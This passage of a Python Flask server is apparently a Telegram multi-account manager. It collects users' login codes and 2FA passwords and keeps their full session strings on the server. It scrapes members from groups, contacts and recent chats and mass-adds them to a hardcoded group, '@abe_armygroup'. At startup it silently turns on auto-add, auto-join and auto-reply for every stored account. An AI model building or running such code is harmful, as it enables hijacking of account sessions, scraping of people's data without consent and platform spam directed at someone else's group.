        account_key = str(acc['id'])
        has_reply = account_key in reply_settings and reply_settings[account_key].get('enabled', False)
        has_auto_add = account_key in auto_add_settings and auto_add_settings[account_key].get('enabled', False)
        formatted.append({
            'id': acc.get('id'),
            'phone': acc.get('phone', ''),
            'name': acc.get('name', 'Unknown'),
            'auto_reply_enabled': has_reply,
            'auto_add_enabled': has_auto_add
        })
    return jsonify({'success': True, 'accounts': formatted})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    try:
        data = request.json
        if not data:
            return jsonify({'success': False, 'error': 'No JSON data received'})
        
        phone = data.get('phone')
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        logger.info(f"Adding account for phone: {phone}")
        
        async def send_code():
            client = TelegramClient(
                StringSession(), 
                API_ID, 
                API_HASH,
                connection_retries=3,
                retry_delay=1,
                timeout=15
            )
            try:
                await client.connect()
                result = await client.send_code_request(phone)
                session_id = str(int(time.time()))
                temp_sessions[session_id] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save()
                }
                return {'success': True, 'session_id': session_id}
            except errors.FloodWaitError as e:
                return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
            except errors.PhoneNumberInvalidError:
                return {'success': False, 'error': 'Invalid phone number'}
            except errors.PhoneNumberBannedError:
                return {'success': False, 'error': 'This phone number is banned'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = run_async(send_code())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': f'Server error: {str(e)}'})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    data = request.json
    code = data.get('code')
    session_id = data.get('session_id')
    password = data.get('password', '')
    
    if not code or not session_id:
        return jsonify({'success': False, 'error': 'Missing code or session'})
    
    if session_id not in temp_sessions:
        return jsonify({'success': False, 'error': 'Session expired'})
    
    session_data = temp_sessions[session_id]
    
    async def verify():
        client = TelegramClient(StringSession(session_data['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            try:
                await client.sign_in(
                    session_data['phone'], 
                    code, 
                    phone_code_hash=session_data['hash']
                )
            except errors.SessionPasswordNeededError:
                if not password:
                    return {'need_password': True}
                await client.sign_in(password=password)
            
            me = await client.get_me()
            
            new_id = 1
            if accounts:
                new_id = max([a['id'] for a in accounts]) + 1
            
            new_account = {
                'id': new_id,
                'phone': me.phone or session_data['phone'],
                'name': me.first_name or 'User',
                'session': client.session.save()
            }
            
            accounts.append(new_account)
            save_accounts()
            
            return {'success': True}
            
        except errors.PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code'}
        except errors.PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired'}
        except errors.PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid password'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(verify())
        if session_id in temp_sessions:
            del temp_sessions[session_id]
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def fetch():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'auth_key_unregistered'}
            
            dialogs = await client.get_dialogs()
            
            chats = []
            for dialog in dialogs:
                if not dialog:
                    continue
                
                chat_type = 'user'
                if dialog.is_group:
                    chat_type = 'group'
                elif dialog.is_channel:
                    chat_type = 'channel'
                
                chat = {
                    'id': str(dialog.id),
                    'title': dialog.name or 'Unknown',
                    'type': chat_type,
                    'unread': dialog.unread_count or 0,
                    'lastMessage': '',
                    'lastMessageDate': 0
                }
                
                if dialog.message:
                    if dialog.message.text:
                        chat['lastMessage'] = dialog.message.text[:50]
                    elif dialog.message.media:
                        chat['lastMessage'] = '📎 Media'
                    
                    if dialog.message.date:
                        chat['lastMessageDate'] = int(dialog.message.date.timestamp())
                
                chats.append(chat)
            
            return {'success': True, 'chats': chats}
            
        except AuthKeyUnregisteredError:
            remove_invalid_account(account_id)
            return {'success': False, 'error': 'auth_key_unregistered'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(fetch())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/send-message', methods=['POST'])
def send_message():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    message = data.get('message')
    
    if not account_id or not chat_id or not message:
        return jsonify({'success': False, 'error': 'Missing required fields'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def send():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            if not await client.is_user_authorized():
                return {'success': False, 'error': 'auth_key_unregistered'}
            
            try:
                entity = await client.get_entity(int(chat_id))
            except:
                try:
                    entity = await client.get_entity(chat_id)
                except:
                    return {'success': False, 'error': 'Chat not found'}
            
            await client.send_message(entity, message)
            return {'success': True}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(send())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    global accounts
    
    stop_auto_reply_for_account(account_id)
    
    original_len = len(accounts)
    accounts = [acc for acc in accounts if acc['id'] != account_id]
    
    if len(accounts) < original_len:
        save_accounts()
        return jsonify({'success': True})
    
    return jsonify({'success': False, 'error': 'Account not found'})

@app.route('/api/reply-settings', methods=['GET'])
def get_reply_settings():
    account_id = request.args.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    settings = reply_settings.get(account_key, {
        'enabled': False,
        'chats': {}
    })
    
    return jsonify({'success': True, 'settings': settings})

@app.route('/api/reply-settings', methods=['POST'])
def update_reply_settings():
    data = request.json
    account_id = data.get('accountId')
    enabled = data.get('enabled', False)
    chat_settings = data.get('chats', {})
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    
    if account_key not in reply_settings:
        reply_settings[account_key] = {}
    
    was_enabled = reply_settings[account_key].get('enabled', False)
    reply_settings[account_key]['enabled'] = enabled
    reply_settings[account_key]['chats'] = chat_settings
    
    save_reply_settings()
    
    if enabled and not was_enabled:
        account = next((acc for acc in accounts if acc['id'] == account_id), None)
        if account and account_key not in active_clients:
            thread = threading.Thread(
                target=lambda: run_async(start_auto_reply_for_account(account)),
                daemon=True
            )
            thread.start()
            client_tasks[account_key] = thread
            logger.info(f"Started auto-reply for account {account_id}")
    elif not enabled and was_enabled:
        stop_auto_reply_for_account(account_id)
    
    return jsonify({'success': True, 'message': 'Settings updated'})

@app.route('/api/toggle-chat-reply', methods=['POST'])
def toggle_chat_reply():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    enabled = data.get('enabled', True)
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    
    if account_key not in reply_settings:
        reply_settings[account_key] = {'enabled': False, 'chats': {}}
    
    if 'chats' not in reply_settings[account_key]:
        reply_settings[account_key]['chats'] = {}
    
    reply_settings[account_key]['chats'][str(chat_id)] = {'enabled': enabled}
    
    save_reply_settings()
    
    return jsonify({'success': True, 'message': f'Auto-reply for chat {"enabled" if enabled else "disabled"}'})

@app.route('/api/conversation-history', methods=['GET'])
def get_conversation_history():
    account_id = request.args.get('accountId')
    chat_id = request.args.get('chatId')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    chat_key = str(chat_id)
    
    history = []
    if account_key in conversation_history and chat_key in conversation_history[account_key]:
        history = conversation_history[account_key][chat_key]
    
    return jsonify({'success': True, 'history': history})

@app.route('/api/clear-history', methods=['POST'])
def clear_conversation_history():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    chat_key = str(chat_id)
    
    if account_key in conversation_history and chat_key in conversation_history[account_key]:
        conversation_history[account_key][chat_key] = []
        save_conversation_history()
    
    return jsonify({'success': True, 'message': 'History cleared'})

@app.route('/api/get-sessions', methods=['POST'])
def get_sessions():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def get_sessions():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            result = await client(functions.account.GetAuthorizationsRequest())
            
            sessions = []
            current_hash = None
            
            for auth in result.authorizations:
                session_info = {
                    'hash': auth.hash,
                    'device_model': auth.device_model,
                    'platform': auth.platform,
                    'system_version': auth.system_version,
                    'api_id': auth.api_id,
                    'app_name': auth.app_name,
                    'app_version': auth.app_version,
                    'date_created': auth.date_created,
                    'date_active': auth.date_active,
                    'ip': auth.ip,
                    'country': auth.country,
                    'region': auth.region,
                    'current': auth.current
                }
                
                if auth.current:
                    current_hash = auth.hash
                
                sessions.append(session_info)
            
            return {'success': True, 'sessions': sessions, 'current_hash': current_hash}
            
        except FreshResetAuthorisationForbiddenError:
            return {'success': False, 'error': 'fresh_reset_forbidden'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(get_sessions())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/terminate-session', methods=['POST'])
def terminate_session():
    data = request.json
    account_id = data.get('accountId')
    session_hash = data.get('hash')
    
    if not account_id or not session_hash:
        return jsonify({'success': False, 'error': 'Account ID and session hash required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def terminate():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            await client(functions.account.ResetAuthorizationRequest(int(session_hash)))
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(terminate())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_sessions():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def terminate():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            result = await client(functions.account.GetAuthorizationsRequest())
            
            current_hash = None
            for auth in result.authorizations:
                if auth.current:
                    current_hash = auth.hash
                    break
            
            count = 0
            for auth in result.authorizations:
                if auth.hash != current_hash:
                    try:
                        await client(functions.account.ResetAuthorizationRequest(auth.hash))
                        count += 1
                    except:
                        continue
            
            return {'success': True, 'message': f'Terminated {count} sessions'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(terminate())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# AUTO-ADD API ENDPOINTS
@app.route('/api/auto-add-settings', methods=['GET'])
def get_auto_add_settings():
    account_id = request.args.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    
    default_settings = {
        'enabled': True,
        'target_group': '@abe_armygroup',
        'delay_seconds': 15,
        'daily_limit': 200,
        'source_groups': DEFAULT_SOURCE_GROUPS,
        'use_contacts': True,
        'use_recent_chats': True,
        'use_scraping': True,
        'scrape_limit_per_group': 500,
        'skip_bots': True,
        'auto_join': True,
        'total_added': 0,
        'added_today': 0,
        'last_reset': datetime.now().strftime('%Y-%m-%d'),
        'last_added': None
    }
    
    if account_key in auto_add_settings:
        settings = auto_add_settings[account_key]
        for key, value in default_settings.items():
            if key not in settings:
                settings[key] = value
    else:
        settings = default_settings.copy()
        auto_add_settings[account_key] = settings
        save_auto_add_settings()
    
    return jsonify({'success': True, 'settings': settings})

@app.route('/api/auto-add-settings', methods=['POST'])
def update_auto_add_settings():
    try:
        data = request.json
        if not data:
            return jsonify({'success': False, 'error': 'No data received'})
        
        account_id = data.get('accountId')
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        account_key = str(account_id)
        
        if account_key not in auto_add_settings:
            auto_add_settings[account_key] = {}
        
        was_enabled = auto_add_settings[account_key].get('enabled', False)
        
        for key in ['enabled', 'target_group', 'delay_seconds', 'daily_limit',
                   'use_contacts', 'use_recent_chats', 'use_scraping',
                   'scrape_limit_per_group', 'skip_bots', 'auto_join']:
            if key in data:
                auto_add_settings[account_key][key] = data[key]
        
        if 'source_groups' in data:
            auto_add_settings[account_key]['source_groups'] = data['source_groups']
        
        save_auto_add_settings()
        
        if auto_add_settings[account_key].get('enabled', False) and not was_enabled:
            account = next((acc for acc in accounts if acc['id'] == account_id), None)
            if account:
                thread = threading.Thread(
                    target=lambda: run_async(ultra_fast_auto_add_loop(account)),
                    daemon=True
                )
                thread.start()
                client_tasks[f"auto_add_{account_key}"] = thread
                logger.info(f"🚀 Started auto-add for account {account_id}")
        
        return jsonify({'success': True, 'message': 'Settings updated'})
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-add-stats', methods=['GET'])
def get_auto_add_stats():
    account_id = request.args.get('accountId')
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    settings = auto_add_settings.get(account_key, {})
    pool = added_members_pool.get(account_key, {})
    
    total_scraped = len(pool.get('all_scraped', []))
    already_added = len(pool.get('already_added', []))
    failed = len(pool.get('failed_to_add', []))
    available = total_scraped - already_added - failed
    
    return jsonify({
        'success': True,
        'added_today': settings.get('added_today', 0),
        'total_added': settings.get('total_added', 0),
        'enabled': settings.get('enabled', False),
        'daily_limit': settings.get('daily_limit', 200),
        'pool_size': total_scraped,
        'available_to_add': max(0, available),
        'already_added': already_added,
        'failed': failed,
        'last_reset': settings.get('last_reset', ''),
        'last_added': settings.get('last_added')
    })

@app.route('/api/test-auto-add', methods=['POST'])
def test_auto_add():
    try:
        data = request.json
        account_id = data.get('accountId')
        
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        account = next((acc for acc in accounts if acc['id'] == account_id), None)
        if not account:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def test():
            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
            await client.connect()
            
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'Account not authorized'}
                
                settings = auto_add_settings.get(str(account_id), {})
                target_group = settings.get('target_group', '@abe_armygroup')
                
                if not target_group.startswith('@') and not target_group.startswith('https://'):
                    target_group = '@' + target_group
                
                group_found = False
                group_title = target_group
                
                try:
                    group = await client.get_entity(target_group)
                    group_found = True
                    group_title = group.title if hasattr(group, 'title') else target_group
                except Exception as e:
                    return {'success': False, 'error': f'Target group error: {str(e)}'}
                
                available = 0
                sources = []
                
                if settings.get('use_contacts', True):
                    try:
                        contacts = await client(functions.contacts.GetContactsRequest(0))
                        available += len(contacts.users)
                        sources.append(f"Contacts: {len(contacts.users)}")
                    except:
                        pass
                
                return {
                    'success': True,
                    'group_found': group_found,
                    'group_title': group_title,
                    'available_members': available,
                    'sources_found': sources,
                    'can_add': group_found and available > 0
                }
                
            finally:
                await client.disconnect()
        
        result = run_async(test())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-join-target-group', methods=['POST'])
def auto_join_target_group_endpoint():
    try:
        data = request.json
        account_id = data.get('accountId')
        
        if not account_id:
            return jsonify({'success': False, 'error': 'Account ID required'})
        
        account = next((acc for acc in accounts if acc['id'] == account_id), None)
        if not account:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        account_key = str(account_id)
        settings = auto_add_settings.get(account_key, {})
        target_group = data.get('targetGroup') or settings.get('target_group', '@abe_armygroup')
        
        async def join_target():
            client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
            await client.connect()
            
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'Account not authorized'}
                
                result = await auto_join_target_group(client, account_id, target_group)
                
                if result:
                    return {
                        'success': True,
                        'message': f'Successfully joined {target_group}',
                        'joined': True
                    }
                else:
                    return {
                        'success': False,
                        'error': f'Could not join {target_group}'
                    }
                    
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = run_async(join_target())
        return jsonify(result)
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/reconnect', methods=['GET'])
def reconnect_all():
    for account_key in list(active_clients.keys()):
        stop_auto_reply_for_account(int(account_key))
    
    time.sleep(2)
    start_auto_reply_thread()
    
    return jsonify({
        'success': True,
        'message': 'Reconnecting all accounts',
        'active': len(active_clients)
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    auto_reply_count = len([k for k in active_clients.keys() if not k.startswith('auto_add_')])
    auto_add_count = len([k for k in active_clients.keys() if k.startswith('auto_add_')])
    
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'auto_reply_active': auto_reply_count,
        'auto_add_active': auto_add_count,
        'active_clients': list(active_clients.keys()),
        'time': datetime.now().isoformat()
    })

# ==================== KEEP ALIVE SYSTEM ====================

def keep_alive():
    """Keep Render from sleeping and maintain Telegram connections"""
    app_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://e-gram-98zv.onrender.com')
    
    while True:
        try:
            requests.get(app_url, timeout=10)
            requests.get(f"{app_url}/api/health", timeout=10)
            
            for account_key, client in list(active_clients.items()):
                try:
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    loop.run_until_complete(client.get_me())
                    loop.close()
                    logger.info(f"✅ Connection alive for account {account_key}")
                except Exception as e:
                    logger.warning(f"⚠️ Connection may be dead for account {account_key}: {e}")
            
            logger.info(f"🔋 Keep-alive ping sent at {time.strftime('%H:%M:%S')}")
        except Exception as e:
            logger.error(f"Keep-alive error: {e}")
        
        time.sleep(240)

# ==================== STARTUP FUNCTIONS ====================

def start_auto_reply_thread():
    """Start auto-reply for all enabled accounts"""
    time.sleep(3)
    for account in accounts:
        account_key = str(account['id'])
        if account_key in reply_settings and reply_settings[account_key].get('enabled', False):
            if account_key not in active_clients:
                thread = threading.Thread(
                    target=lambda acc=account: run_async(start_auto_reply_for_account(acc)),
                    daemon=True
                )
                thread.start()
                client_tasks[account_key] = thread
                time.sleep(2)

def start_auto_add_threads():
    """Start auto-add with auto-join for all enabled accounts"""
    time.sleep(5)
    logger.info("Checking for auto-add enabled accounts with auto-join...")
    for account in accounts:
        account_key = str(account['id'])
        if account_key in auto_add_settings and auto_add_settings[account_key].get('enabled', False):
            target_group = auto_add_settings[account_key].get('target_group', '@abe_armygroup')
            thread = threading.Thread(
                target=lambda acc=account: run_async(ultra_fast_auto_add_loop(acc)),
                daemon=True
            )
            thread.start()
            client_tasks[f"auto_add_{account_key}"] = thread
            logger.info(f"🚀 Started auto-add with auto-join to {target_group} for account {account.get('name')}")

def auto_start_all_accounts():
    """Auto-start both auto-reply and auto-add for all accounts on startup"""
    time.sleep(5)
    
    for account in accounts:
        account_key = str(account['id'])
        
        # Initialize auto-add settings if not exist
        if account_key not in auto_add_settings:
            auto_add_settings[account_key] = {
                'enabled': True,
                'target_group': '@abe_armygroup',
                'delay_seconds': 15,
                'daily_limit': 200,
                'source_groups': DEFAULT_SOURCE_GROUPS,
                'use_contacts': True,
                'use_recent_chats': True,
                'use_scraping': True,
                'scrape_limit_per_group': 500,
                'skip_bots': True,
                'auto_join': True,
                'total_added': 0,
                'added_today': 0,
                'last_reset': datetime.now().strftime('%Y-%m-%d'),
                'last_added': None
            }
            save_auto_add_settings()
        
        # Initialize reply settings if not exist
        if account_key not in reply_settings:
            reply_settings[account_key] = {
                'enabled': True,
                'chats': {}
            }
            save_reply_settings()
        
        # Start auto-reply if enabled
        if reply_settings[account_key].get('enabled', True):
            if account_key not in active_clients:
                thread = threading.Thread(
                    target=lambda acc=account: run_async(start_auto_reply_for_account(acc)),
                    daemon=True
                )
                thread.start()
                client_tasks[account_key] = thread
                logger.info(f"💬 Auto-reply started for {account.get('name')}")
        
        # Start auto-add if enabled
        if auto_add_settings[account_key].get('enabled', True):
            target_group = auto_add_settings[account_key].get('target_group', '@abe_armygroup')
            thread = threading.Thread(
                target=lambda acc=account: run_async(ultra_fast_auto_add_loop(acc)),
                daemon=True
            )
            thread.start()
            client_tasks[f"auto_add_{account_key}"] = thread
            logger.info(f"🚀 Auto-add with auto-join started for {account.get('name')} -> {target_group}")

# ==================== MAIN STARTUP ====================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print('\n' + '='*70)
    print('🤖 TELEGRAM MULTI-ACCOUNT MANAGER')
    print('='*70)
    print(f'✅ Port: {port}')
    print(f'✅ Accounts loaded: {len(accounts)}')
    print(f'✅ Reply settings loaded: {len(reply_settings)}')
    print(f'✅ Auto-add settings loaded: {len(auto_add_settings)}')
    print('='*70)
    print('🎯 FEATURES:')
    print('   • Auto-Reply (Abel AI)')
    print('   • Auto-Add Members')
    print('   • Auto-Join Target Group')
    print('='*70)
    
    # Start keep-alive
    threading.Thread(target=keep_alive, daemon=True).start()
    
    # Auto-start all features
    threading.Thread(target=auto_start_all_accounts, daemon=True).start()
    
    app.run(host='0.0.0.0', port=port, debug=False)
